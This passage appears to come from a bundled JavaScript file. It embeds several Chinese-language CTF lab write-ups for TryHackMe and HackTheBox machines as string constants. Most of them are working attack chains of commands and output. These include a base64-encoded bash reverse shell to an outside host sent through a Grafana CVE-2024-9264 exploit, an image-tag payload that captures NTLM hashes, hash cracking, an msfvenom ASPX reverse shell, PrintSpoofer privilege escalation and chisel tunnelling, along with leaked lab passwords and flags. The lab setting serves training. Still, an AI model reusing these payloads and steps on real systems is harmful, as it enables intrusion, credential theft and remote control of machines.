4. 模糊测试 GET & POST 参数
5. XSS（跨站点脚本）
6. XSS 旁路
7. 存储型 XSS、反射型 XSS
8. 打开重定向
9. CSRF（跨站点请求伪造）
10. CSRF 保护绕过
11. IDOR （不安全的直接对象引用）
12. LFI （本地文件包含）
13. LFI 旁路
14. SSRF（服务器端请求伪造）
15. SSRF 旁路
16. XXE（XML 外部实体注入）
17. 通过 XLSX 文件进行盲 XXE
18. RCE （远程代码执行）
19. 密码猜测
20. 编辑页面以获取 PHP 反向 shell
21. 命令注入
22. 基于错误的 SQL 注入
23. 基于盲目的 SQL 注入
## 总结

加深了漏洞出现点和如何\`burpsuite\`的一些技巧。

`,rn=`---
title: THM-Nax
tags:
  - 靶场
  - THM
description:
---
## 靶场概述

难度： Middle
描述：识别市场上功能最强大、最值得信赖的网络监控软件中的关键安全漏洞，该漏洞允许用户进行身份验证执行远程代码。

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息     |
| --- | ----------- | ---------- |
| IP  | 10.17.5.121 | 10.10.61.3 |
| OS  | kali        |            |

---
## 信息搜集

1. 端口扫描
2. 路径探测
3. 服务枚举

## 渗透思路

1. 攻击向量
2. nday利用
3. 信息审计

## 漏洞利用

## getshell

## 提权


## 知识点回顾
## 总结

`,cn="![](assets/img/Pasted%20image%2020241115193217.png)",ln=`---
title: planning.htb
tags: [Sec, HTB]
categories: [Sec]
---


base64

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE=


bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE=}|{base64,-d}|{bash,-i}'

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE= | base64 -d | bash'



uv run CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC80NDQzIDA+JjE= | base64 -d | bash' http://grafana.planning.htb/


env 获取passwd，username

RioTecRANDEntANT!

enzo

ssh enzo@planning.htb

user.txt
c5edef7a894239d2bb48415661e20b32
root.txt
2463aa9b7a928bcdc33223fb8c9ca74a`,An=`---
title: thm-ra-windows域主机的入侵流程
tags:
  - 靶场
  - "#Windows"
description:
---
> 您已经可以访问 WindCorp 的内部网络，这家价值数十亿美元的公司正在运行广泛的社交媒体活动，声称无法破解（哈！这个说法就这么多了！

下一步是拿起他们的皇冠上的明珠，获得对他们内部网络的完全访问权限。您已经发现了一台新的 Windows 机器，它可能会引导您实现最终目标。你能征服这个最终 Boss 并拥有他们的内部网络吗？

祝您黑客活动愉快！

## 靶场概述

难度： 
描述：hard

---
## 基本信息

| 🚀  | 本地机器信息 | 目标机器信息  |
| --- | ------------ | ------------- |
| IP  | 10.17.5.121  | 10.10.237.226 |
| OS  | kali         | windwos       |

---
## 信息搜集


![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234043.png)

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234158.png)

提取出mail
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234719.png)
\`\`\`
organicfish718@fire.windcorp.thm  
organicwolf509@fire.windcorp.thm  
tinywolf424@fire.windcorp.thm  
angrybird253@fire.windcorp.thm  
buse@fire.windcorp.thm  
Edeltraut@fire.windcorp.thm  
Edward@fire.windcorp.thm  
Emile@fire.windcorp.thm  
tinygoose102@fire.windcorp.thm  
brownostrich284@fire.windcorp.thm  
sadswan869@fire.windcorp.thm  
goldencat416@fire.windcorp.thm  
whiteleopard529@fire.windcorp.thm  
happymeercat399@fire.windcorp.thm  
orangegorilla428@fire.windcorp.thm  
\`\`\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234958.png)


![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234948.png)

或许可以解决重置密码的密保
Lily Levesque
AndSparky
lilyleAndSparky.jpg
通过一些信息获取到了lilyle 的密码
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204235510.png)

\`\`\`
lilyle
ChangeMe#1234
\`\`\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204235643.png)

尝试用lilyle的凭证登录
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204235818.png)


有个注意点 观察到443端口也是开放的
使用https访问主域名

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205001406.png)

此路暂时不通缺少凭证

## 攻击向量

smb  445 利用
发现share目录获取内容
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205002047.png)


## 漏洞利用

Spark 2.8.3 的安装文件也很多，根据快速的谷歌搜索，我们发现 Spark 2.8.3 是易受攻击的。我将从 smb 共享中获取 .deb 文件。
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205002748.png)


在阅读 时，我发现了这个 [github 存储库](https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md)，它实际上是由这台机器的制造商创建的。据此，我们可以使用 spark 向其他用户发送带有 img 标签的消息，每次用户点击链接，或者 ROAR 模块自动预加载时，外部服务器都会收到访问链接的用户（即您正在聊天的用户）对图像的请求，以及 NTLM 哈希值！  
如 github 存储库中所述，我们将使用并发送带有 img 标签的消息，并且我们应该会收到访问该链接的用户的 NTLM 哈希值。\`CVE-2020-12772\`\`responder\`


![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205002858.png)


我们有一个用户名列表，我们可以将我们的有效负载 发送给不同的用户，如果我们获得其中任何一个的 NTLM 哈希值，请在响应者中签入。

\`\`\`
“<img src=http：//yourtun0IP/a.png>”
\`\`\`

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205003024.png)

\`\`\`
[+] Listening for events...
[HTTP] NTLMv2 Client   : 10.10.226.131
[HTTP] NTLMv2 Username : WINDCORP\\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:581eb034fb28c39c:54A0D21F2C7F9C9FC662887D404ADBE6:010100000000
00003016F4F0AEBAD6019F1E18DD6C6FF8DD000000000200060053004D0042000100160053004D0042002D0054004F004F004C
004B00490054000400120073006D0062002E006C006F00630061006C0003002800730065007200760065007200320030003000
33002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000
00000000000100000000200000D06AF3C0BE5C4909A34ED0E1314D4F4E9E879FB75EC17102D80D7E32C45E88740A0010000000
0000000000000000000000000000090000000000000000000000
[*] Skipping previously captured hash for WINDCORP\\buse
\`\`\`


\`\`\`
┌──(sid㉿kali)-[~/Documents/flags/tryhackme/ra]
└─$ echo "buse::WINDCORP:581eb034fb28c39c:54A0D21F2C7F9C9FC662887D404ADBE6:01010000000000003016F4F0AEBAD6019F1E18DD6C6FF8DD00000000020006005300
4D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C00030028007300650072007600650072003200300
0300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000D06AF3C0BE
5C4909A34ED0E1314D4F4E9E879FB75EC17102D80D7E32C45E88740A00100000000000000000000000000000000000090000000000000000000000" > hash
                                                                                                                                     
┌──(sid㉿kali)-[~/Documents/flags/tryhackme/ra]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
uzunLM+3131      (buse)
\`\`\`

利用\`crackmapexec\` 凭据验证

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205004009.png)
crackmapexec 中 Pwn3d！对于 WinRM，这意味着我们可以使用 Evil-WinRM 来进入盒子。

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205004222.png)


## 提权

首先，我们检查 buse 用户属于哪些组，以及我们是否有任何特殊权限。

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205004846.png)


我们看到我们是 Account Operators 组的一部分，这意味着我们可以修改除 admin 帐户之外的所有帐户。然后在检查不同的目录时，我们找到一个 scripts 目录，其中包含一个 checkservers.ps1 powershell 脚本，它告诉我们“C：\\Users\\brittanycr\\hosts.txt”正在自动运行/使用。终会读取每一行并通过Invoke-Expression执行

由于我们是 Account Operators 组的一部分，因此让我们重置帐户 “brittanycr” 的密码


![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205005549.png)


看来我们不能把 psexec 或 winrm 作为 brittanycr 放进盒子里。让我们使用 smbclient 来放置我们的恶意hosts.txt文件。

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205005845.png)

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205010316.png)

\`\`\`
┌──(sid㉿kali)-[~/Documents/flags/tryhackme/ra]
└─$ crackmapexec smb windcorp.thm -u sid -p 'hello!123'
SMB         10.10.226.131   445    FIRE             [*] Windows 10.0 Build 17763 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         10.10.226.131   445    FIRE             [+] windcorp.thm\\sid:hello!123 (Pwn3d!)
                                                                                                                                     
┌──(sid㉿kali)-[~/Documents/flags/tryhackme/ra]
└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py  sid@windcorp.thm          
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on windcorp.thm.....
[*] Found writable share ADMIN$
[*] Uploading file cfKhdeUq.exe
[*] Opening SVCManager on windcorp.thm.....
[*] Creating service TNal on windcorp.thm.....
[*] Starting service TNal.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1158]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\\Windows\\system32>cd c:\\users\\Administrator\\Desktop
 
c:\\Users\\Administrator\\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 84E1-0562

 Directory of c:\\Users\\Administrator\\Desktop

05/10/2020  03:17 AM    <DIR>          .
05/10/2020  03:17 AM    <DIR>          ..
05/07/2020  12:22 AM                47 Flag3.txt
               1 File(s)             47 bytes
               2 Dir(s)  44,605,804,544 bytes free

c:\\Users\\Administrator\\Desktop>type "Flag3.txt"
THM{ba3a2bff2e******************************}

c:\\Users\\Administrator\\Desktop>
\`\`\`


## 知识点

### **1. 检查 WinRM 服务是否启用**

使用工具如 **CrackMapExec** 或 **Nmap** 来检测目标系统是否开启 WinRM 服务。

#### **1.1 使用 CrackMapExec**

bash

复制代码

\`crackmapexec winrm <target-ip> -u <username> -p <password>\`

- 如果输出中显示 **\`[+]\`**，说明凭据有效且 WinRM 可用。
- 如果显示 **\`[-]\`**，可能是凭据无效或服务未启用。

#### **1.2 使用 Nmap**

扫描端口 5985（HTTP）和 5986（HTTPS），它们是 WinRM 默认使用的端口：

bash

复制代码

\`nmap -p 5985,5986 <target-ip>\`

- 如果显示端口开放，说明 WinRM 可能正在运行。

---

### **2. 验证 WinRM 服务的响应**

使用工具如 **Evil-WinRM**、**CrackMapExec** 或 **Python 脚本**来验证服务和凭据。

#### **2.1 使用 Evil-WinRM**

安装 **Evil-WinRM**：

bash

复制代码

\`sudo gem install evil-winrm\`

验证目标：

bash

复制代码

\`evil-winrm -i <target-ip> -u <username> -p <password>\`

- 成功连接后，你将进入目标系统的交互式 PowerShell 环境。
- 如果失败，检查服务是否正常运行或凭据是否有效。

#### **2.2 使用 CrackMapExec**

bash

复制代码

\`crackmapexec winrm <target-ip> -u <username> -p <password>\`

- 显示 **\`Pwn3d!\`** 表示凭据有效并且具有管理员权限


## 2. \`CrackMapExec\`的作用
1. **用户凭据验证**
    
    - 检查目标网络中某个用户凭据是否有效。
    - 支持多种身份验证方式（明文密码、哈希、Kerberos票据等）。
2. **共享文件和目录枚举**
    
    - 枚举共享资源。
    - 下载或上传文件到目标系统的共享目录。
3. **命令执行**
    
    - 在目标机器上远程执行命令（需要管理员权限）。
    - 支持多种协议如 WinRM、SMB。
4. **凭据提取**
    
    - 使用 Mimikatz 从目标提取用户凭据或哈希值。
5. **Active Directory 集成**
    
    - 枚举域用户、域组和域计算机信息。
    - 针对 Active Directory 的攻击（如 Kerberos 金票/银票、DC Sync 攻击等）。
6. **自动化攻击**
    
    - 支持自动化 lateral movement（横向移动）。
    - 支持多目标批量操作。
## 分析whoami 

通过 \`whoami /all\` 的输出，我们可以提取和分析与用户权限、组成员身份以及特权相关的信息，以判断用户在目标系统上的能力以及潜在的攻击面。以下是详细的分析：

---

### **1. 用户信息**

- **用户名**: \`windcorp\\buse\`
    - 表示用户 \`buse\` 在域 \`windcorp\` 中。
- **SID**: \`S-1-5-21-555431066-3599073733-176599750-5777\`
    - 安全标识符，唯一标识该用户。
    - SID 的结构表明此用户是域用户，而非本地用户。

---

### **2. 组信息**

用户属于多个组，其中一些组提供了有用的信息：

#### **关键组分析**

1. **\`BUILTIN\\Account Operators\`**
    
    - **高权限组**：此组的成员通常有能力管理账户，包括创建或修改用户账户。
    - **潜在利用点**：可以检查是否能创建一个高权限用户（如域管理员）。
2. **\`BUILTIN\\Remote Desktop Users\`**
    
    - 用户属于远程桌面组，说明此用户可以通过 RDP 访问目标系统。
    - **潜在利用点**：尝试使用 RDP 连接并获取更高权限的访问。
3. **\`BUILTIN\\Remote Management Users\`**
    
    - 此组成员默认可以通过 WinRM 远程访问系统。
    - **已验证**：通过 Evil-WinRM 成功登录确认。
4. **\`WINDCORP\\IT\`**
    
    - 自定义组，可能赋予 IT 相关权限。
    - **潜在利用点**：查询此组的特权，判断是否有管理功能。

---

### **3. 权限信息**

用户当前拥有以下权限：

#### **关键权限分析**

1. **\`SeMachineAccountPrivilege\`**
    
    - **描述**: 允许用户将工作站加入域。
    - **潜在利用点**:
        - 可以滥用此权限在域中创建计算机对象。
        - 借助工具（如 **PowerMad** 或 **AD Module**）创建恶意机器账户，并使用相关的 SPN 进一步执行 Kerberos 票据攻击（如 **Kerberoasting**）。
2. **\`SeChangeNotifyPrivilege\`**
    
    - **描述**: 允许用户绕过文件和目录的遍历检查。
    - **攻击意义**: 这是普通权限，对攻击意义不大。
3. **\`SeIncreaseWorkingSetPrivilege\`**
    
    - **描述**: 允许用户调整进程的工作集大小。
    - **攻击意义**: 通常与内存管理有关，对攻击用途有限。

---

### **4. 动态访问控制**

- **\`Kerberos support for Dynamic Access Control on this device has been disabled.\`**
    - **描述**: 目标设备不支持基于动态访问控制（DAC）的 Kerberos 身份验证。
    - **攻击意义**: 这不会直接影响你的渗透，但表明目标系统的安全配置可能较老。

---

### **5. 攻击面与利用建议**

根据当前信息，你可以尝试以下攻击：

#### **利用现有特权**

1. **机器账户攻击**
    
    - 滥用 \`SeMachineAccountPrivilege\` 创建一个恶意的计算机对象。
    - 示例命令（使用 PowerMad 模块）：
        
        powershell
        
        复制代码
        
        \`Import-Module PowerMad New-MachineAccount -MachineAccount EvilMachine -Password $(ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)\`
        
    - 然后使用 Kerberos 票据进一步攻击（如 Golden/Silver Ticket）。
2. **RDP 登录**
    
    - 用户属于 \`Remote Desktop Users\`，尝试使用 RDP 登录目标系统以获得 GUI 访问。
    - RDP 工具：
        
        bash
        
        复制代码
        
        \`xfreerdp /u:buse /p:'uzunLM+3131' /v:<target-ip>\`
        

#### **探索更高权限**

3. **账户操作**
    
    - 利用 \`Account Operators\` 权限，尝试创建新账户或修改现有账户。
    - 创建本地管理员账户的 PowerShell 示例：
        
        powershell
        
        复制代码
        
        \`net user admin2 Password123! /add net localgroup administrators admin2 /add\`
        
4. **枚举域信息**
    
    - 使用 PowerShell 或 CrackMapExec 枚举域中的用户、组和计算机：
        
        bash
        
        复制代码
        
        \`crackmapexec smb <target-ip> -u buse -p 'uzunLM+3131' --shares crackmapexec ldap <target-ip> -u buse -p 'uzunLM+3131' --users\`
        
5. **尝试 Kerberoasting**
    
    - 如果域中存在带有 SPN 的服务账户，尝试执行 Kerberoasting 攻击，提取可破解的 Kerberos 票据。

---

### **总结**

- **当前用户具有一定权限，但并非管理员**。
- 可以尝试滥用 \`SeMachineAccountPrivilege\` 和 \`Account Operators\` 权限提升攻击范围。
- 使用 Evil-WinRM 和 CrackMapExec 进一步枚举目标系统和域的详细信息。
## 总结

`,pn=`---
title: relevant-thm
tags:
  - 靶场
  - THM
description:
---
## 题目描述

> 难度：中等
> 描述：
> 前置条件：

您已被分配到一个需要渗透测试的客户 在应在 7 天后发布到生产环境的环境中执行。

**工作范围**

客户端请求 工程师进行评估 提供的虚拟环境。客户要求最低限度 提供有关评估的信息，希望参与 从恶意行为者的眼睛进行（黑匣子渗透 test） 的客户端要求您保护两个标志（无位置 提供）作为利用证明：

- User.txt
- Root.txt  

此外，客户还提供了以下范围限额：

- 此项目允许使用任何工具或技术，但我们要求您先尝试手动利用  
    
- 找到并记录发现的所有漏洞
- 将发现的标记提交到仪表板
- 只有分配给计算机的 IP 地址在范围内
- 查找并报告所有漏洞（是的，通往 root 的路径不止一条）

（角色扮演关闭）

我 鼓励您将此挑战视为实际的渗透测试。 考虑写一份报告，包括执行摘要。 漏洞和利用评估以及补救建议， 因为这将使您为 eLearnSecurity 认证专业渗透测试员或职业生涯做好准备 作为现场的渗透测试人员。

注意 - 此房间中没有任何内容需要 Metasploit

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息        |
| --- | ----------- | ------------- |
| IP  | 10.17.5.121 | 10.10.106.190 |
| OS  | kali        | Windows       |

## 信息搜集

### 端口扫描

\`\`\`
Open 10.10.106.190:445
Open 10.10.106.190:80
Open 10.10.106.190:135
Open 10.10.106.190:139
Open 10.10.106.190:3389
Open 10.10.106.190:49663
Open 10.10.106.190:49668
Open 10.10.106.190:49666
\`\`\`


\`\`\`
49663/tcp open  http               syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
\`\`\`
### 路径枚举

\`\`\`
 enum4linux 10.10.106.190 
\`\`\`

\`\`\`
❯ smbclient -L //10.10.106.190                                                                                                  
Password for [WORKGROUP\\kali]:                                                                                                  
                                                                                                                                
        Sharename       Type      Comment                                                                                       
        ---------       ----      -------                                                                                       
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.106.190 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

\`\`\`


\`\`\`
kali@kali ~/Documents/thm/creative 
❯ smbclient //10.10.106.190/nt4wrksv                                                                                            
Password for [WORKGROUP\\kali]:                                                                                                  
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4944646 blocks available

\`\`\`


\`\`\`
kali@kali ~/Documents/thm/creative [127]
❯ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" |base64 -d                                                                                
Bob - !P@$$W0rD!123⏎                                                               kali@kali ~/Documents/thm/creative 
❯ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" |base64 -d                                                                    
Bill - Juw4nnaM4n420696969!$$$⏎                                                     kali@kali ~/Documents/thm/creative 

\`\`\`
SSH登录失败
寻找别的攻击向量
如果能找到文件上传的地方 和文件调用的地方可以获取webshell

可以访问到smb里面的文件

\`\`\`bash
┌──(kali㉿kali)-[~/Documents/thm/creative]
└─$ curl http://10.10.106.190:49663/nt4wrksv/passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
\`\`\`
## 漏洞发现

获取上传aspshell 获取webshell

## 漏洞利用

![](../assets/img/Pasted%20image%2020241116174645.png)
## webshell
![](../assets/img/Pasted%20image%2020241116174724.png)

\`\`\`
┌──(kali㉿kali)-[~/Documents/thm/relevant]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.5.121 LPORT=1234 -f aspx -o shell.aspx 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3422 bytes
Saved as: shell.aspx

\`\`\`

\`\`\`
┌──(kali㉿kali)-[~/Documents/thm/relevant]
└─$ curl http://10.10.106.190:49663/nt4wrksv/shell.aspx

\`\`\`

![](../assets/img/Pasted%20image%2020241116175603.png)

\`\`\`
c:\\windows\\system32\\inetsrv>whoami
whoami
iis apppool\\defaultapppool
\`\`\`

## usershell


\`\`\`
PS C:\\Users\\Bob\\Desktop> cat user.txt
cat user.txt
THM{}

\`\`\`

## rootshell


\`\`\`
PS C:\\Users\\Bob\\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:
\`\`\`

由上图可知 当前用户似乎启用了 SeImpersonatePrivilege 令牌权限，这意味着我们可以使用令牌模拟来提升权限；接下来我们需要在目标机上执行一个漏洞利用程序--下载PrintSpoofer.exe，并将该exe文件上传到目标机（可以通过SMB服务上传文件）。

\`\`\`
dir /s /b c:\\ | find "PrintSpoofer64.exe"
\`\`\`


\`\`\`
C:\\inetpub\\wwwroot\\nt4wrksv>whoami
whoami
iis apppool\\defaultapppool

C:\\inetpub\\wwwroot\\nt4wrksv>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32>whoami
whoami
nt authority\\system

C:\\Windows\\system32>
\`\`\`


\`\`\`
C:\\Users\\Administrator\\Desktop>type root.txt
type root.txt
THM{}
\`\`\`
## 知识点回顾
## 总结

SMB文件上传到webshell获取
通过在 Windows 10 和 Server 2016/2019 上滥用从 LOCAL/NETWORK SERVICE 到 SYSTEM。\`SeImpersonatePrivilege\`

应该还有其他思路 有两个base64文件没有利用
`,dn=`---
title: road
tags:
  - 靶场
  - THM
description: 灵感来自现实世界的渗透测试活动
---
## 题目描述

> 难度：中等
> 描述：像往常一样，获取 user 和 root 标志。
> 前置条件：

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息       |
| --- | ----------- | ------------ |
| IP  | 10.17.5.121 | 10.10.177.40 |
| OS  | kali        | Linux        |

## 信息搜集

### 端口扫描

\`\`\`
Open 10.10.141.52:22
Open 10.10.141.52:80

\`\`\`

### 路径枚举

\`\`\`
http://10.10.141.52/v2/index.php
http://10.10.141.52/phpMyAdmin/
\`\`\`

### cms识别

\`\`\`
└─$ whatweb http://10.10.141.52/phpMyAdmin/                                             
http://10.10.141.52/phpMyAdmin/ [200 OK] Apache[2.4.41], Bootstrap, Content-Security-Policy[default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';,default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';], Cookies[phpMyAdmin,pma_lang], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[phpMyAdmin,pma_lang], IP[10.10.141.52], JQuery, PasswordField[pma_password], Script[text/javascript], Title[phpMyAdmin], UncommonHeaders[x-ob_mode,referrer-policy,content-security-policy,x-content-security-policy,x-webkit-csp,x-content-type-options,x-permitted-cross-domain-policies,x-robots-tag], X-Frame-Options[DENY], X-UA-Compatible[IE=Edge], X-XSS-Protection[1; mode=block], phpMyAdmin[5.1.0]
     
\`\`\`
## 漏洞发现


\`\`\`
WordPress Plugin Portable phpMyAdmin - Authentication Bypass                                  | php/webapps/23356.txt

\`\`\`


![](assets/img/Pasted%20image%2020241116204109.png)

文件上传处
![](assets/img/Pasted%20image%2020241116204150.png)

有个重置用户的密码处

可以修改\`admin@sky.thm\` 的密码吗

可以修改

## 漏洞利用

利用admind的账号进行上传和反弹shell

\`任意文件上传\`

\`\`\`
Listening on 0.0.0.0 1234
Connection received on 10.10.141.52 35518
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 12:56:49 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
\`\`\`
## webshell
获取了，可以进行shell维持
## usershell

\`\`\`
www-data@sky:/$ ss -tnlu
ss -tnlu
Netid     State      Recv-Q     Send-Q              Local Address:Port            Peer Address:Port     Process     
udp       UNCONN     0          0                   127.0.0.53%lo:53                   0.0.0.0:*                    
udp       UNCONN     0          0               10.10.141.52%eth0:68                   0.0.0.0:*                    
tcp       LISTEN     0          4096                127.0.0.53%lo:53                   0.0.0.0:*                    
tcp       LISTEN     0          128                       0.0.0.0:22                   0.0.0.0:*                    
tcp       LISTEN     0          70                      127.0.0.1:33060                0.0.0.0:*                    
tcp       LISTEN     0          511                     127.0.0.1:9000                 0.0.0.0:*                    
tcp       LISTEN     0          4096                    127.0.0.1:27017                0.0.0.0:*                    
tcp       LISTEN     0          151                     127.0.0.1:3306                 0.0.0.0:*                    
tcp       LISTEN     0          511                             *:80                         *:*                    
tcp       LISTEN     0          128                          [::]:22                      [::]:*                    
\`\`\`

## 反向代理

kali启动服务端
\`\`\`
chisel server -p 8888 --reverse

2024/11/16 21:28:51 server: Reverse tunnelling enabled
2024/11/16 21:28:51 server: Fingerprint CPyZ11V0OUg5OOq3hTjFuiTChTaWgj0fUQFRwWyvdTU=
2024/11/16 21:28:51 server: Listening on http://0.0.0.0:8888
2024/11/16 21:30:07 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2024/11/16 21:30:07 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

\`\`\`

目标机器启动客户端

\`\`\`
www-data@sky:/tmp$ ./chisel client 10.17.5.121:8888 R:
socks
\`\`\`


大致流程

kali启动服务端，目标机器连接服务端， 服务端启动一个socks代理
proxychains \`127.0.0.1:1080\` 进行内网渗透


\`\`\`
root@HACK ~# proxychains rustscan -a 127.0.0.1 -p 27017
ProxyChains-3.1 (http://proxychains.sf.net)
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  \`| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
\`-' \`-'\`-----'\`----'  \`-'  \`----'  \`---' \`-'  \`-'\`-' \`-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:27017-<><>-OK
Open 127.0.0.1:27017
[~] Starting Script(s)
[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-16 21:50 HKT
Initiating SYN Stealth Scan at 21:50
Scanning localhost (127.0.0.1) [1 port]
Completed SYN Stealth Scan at 21:50, 0.02s elapsed (1 total ports)
Nmap scan report for localhost (127.0.0.1)
Host is up, received localhost-response (0.000065s latency).
Scanned at 2024-11-16 21:50:45 HKT for 0s

PORT      STATE  SERVICE REASON
27017/tcp closed mongod  reset ttl 64

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
           Raw packets sent: 1 (44B) | Rcvd: 2 (84B)


\`\`\`


\`\`\`
$ mongo --port 27017
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("65039ed9-60ef-4a2c-a5d3-9271c3de8923") }
MongoDB server version: 4.4.6

\`\`\`


\`\`\`
MongoDB server version: 4.4.6
show databases;
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
use backup;
switched to db backup
show tables;
collection
user
select * from user;
uncaught exception: SyntaxError: unexpected token: identifier :
@(shell):1:14
show collections
collection
user
db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
